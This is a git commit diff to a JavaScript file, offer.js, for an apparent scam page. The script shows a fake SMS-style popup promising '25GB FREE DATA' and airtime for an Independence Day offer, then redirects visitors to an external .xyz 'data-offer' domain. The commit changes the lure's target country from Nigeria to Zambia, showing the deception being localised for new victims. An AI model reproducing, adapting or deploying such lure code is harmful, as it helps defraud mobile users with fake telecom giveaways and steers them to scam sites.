57a37da20c75d28a3867419413a56348266655a9
decullian <decullianresort@gmail.com>
2024-10-21 16:10:52 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '25GB FREE DATA'
-password=prompt('SMS: Congratulations Your Number is Eligible to receive 25GB + ₦3,000 Airtime NIGERIA @64 INDEPENDENCE DAY OFFER, Kindly press ok to ACTIVATE','25GB FREE DATA');
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 25GB + K50 Airtime ZAMBIA @60 INDEPENDENCE DAY OFFER, Kindly press ok to ACTIVATE','25GB FREE DATA');
 if (password != '25GB FREE DATA') {
 location.href='http://independence.data-offer.xyz/50GB';
 }
